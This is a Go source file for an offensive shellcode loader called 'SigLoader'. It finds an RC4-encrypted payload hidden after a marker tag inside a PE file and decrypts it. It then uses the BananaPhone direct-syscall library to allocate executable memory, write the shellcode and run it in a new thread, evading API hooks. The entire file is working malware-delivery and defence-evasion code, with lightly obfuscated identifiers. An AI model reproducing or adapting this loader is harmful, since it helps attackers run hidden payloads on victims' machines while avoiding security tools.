package main

import (
	"fmt"
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)



func scanPattern(peBytes []byte, pattern []byte) int{
	var max = len(peBytes) - len(pattern) + 1
	var j int
	for i := 0; i < max; i++ {
		if peBytes[i] != pattern[0] { continue}
		for j = len(pattern) - 1; j >= 1 && peBytes[i + j] == pattern[j]; j--{}
		if j == 0{return i}
	}
	return -1
}

func Decrypt(data []byte,encKey string)[]byte{
	keyLen := len(encKey)
	dataLen := len(data)
	var tmp byte
	result := make([]byte,dataLen)
	var j = 0
	var t = 0
	var i = 0
	var S [256]byte
	var T [256]byte


	for i = 0; i < 256; i++	{
		S[i] = uint8(i)
		T[i] = encKey[i % keyLen]
	}

	for i = 0; i < 256; i++	{
		j = (j + int(S[i]) + int(T[i])) % 256
		tmp = S[j]
		S[j] = S[i]
		S[i] = tmp
	}
	j = 0
	for x := 0; x < dataLen; x++{
		i = (i + 1) % 256
		j = (j + int(S[i])) % 256

		tmp = S[j]
		S[j] = S[i]
		S[i] = tmp

		t = (int(S[i]) + int(S[j])) % 256

		result[x] = data[x] ^ S[t]
	}
	return result
}

func createTh(scci []byte,hand1e uintptr, a11o,wr1te,cth uint16) {
	shellcode := append(scci,[]byte("0x00")[0])
	const (
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)
	//hand1e := uintptr(windows.CurrentProcess()) //special macro that says 'use this thread/process' when provided as a handle.
	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	_, r := bananaphone.Syscall(
		a11o, //Ntallocatevirtualmemory
		hand1e,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_EXECUTE_READWRITE,
	)
	if r != nil {
		return
	}
	//NtWriteVirtualMemory
	_, r = bananaphone.Syscall(
		wr1te, //NtWriteVirtualMemory
		hand1e,
		baseA,
		uintptr(unsafe.Pointer(&shellcode[0])),
		regionsize,
		0,
	)
	if r != nil {
		return
	}
	var hhosthread uintptr
	_, r = bananaphone.Syscall(
		cth,                                  //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		hand1e,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
	if r != nil {
		return
	}
}


func main(){
	if len(os.Args)<3 || os.Args[1] == "-h"{
		fmt.Println("help:\n    SigLoader.exe target.exe DecryptKey")
		os.Exit(0)
	}
	name := os.Args[1]
	encKey := os.Args[2]
	var tag = []byte{0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce}

	df, e := ioutil.ReadFile(string(name))
	if e != nil {
		fmt.Println("Could not load PE File")
		os.Exit(0)
	}
	fmt.Println("[+]:Scanning for Shellcode...")
	dataOffset := scanPattern(df,tag)
	if dataOffset == -1{
		fmt.Println("Could not locate data or shellcode")
		os.Exit(0)
	}
	pos := dataOffset+len(tag)
	fmt.Printf("[+]:Shellcode located at %x\n", pos)
	shellcode := df[pos:]
	data := Decrypt(shellcode,encKey)
	fmt.Println("[+]:Shellcode Decrypted")


	fmt.Println("[+]:Shellcode Executing")

	fmt.Println("Mess with the banana, die like the... banana?")
	bp, e := bananaphone.NewBananaPhone(bananaphone.DiskBananaPhoneMode)
	if e != nil {
		panic(e)
	}

	//resolve the functions and extract the syscalls
	alloc, e := bp.GetSysID("NtAllocateVirtualMemory")
	if e != nil {
		panic(e)
	}
	wr1te, e := bp.GetSysID("NtWriteVirtualMemory")
	if e != nil {
		panic(e)
	}
	cth, e := bp.GetSysID("NtCreateThreadEx")
	if e != nil {
		panic(e)
	}

	createTh(data,uintptr(0xffffffffffffffff),alloc,wr1te,cth)
}
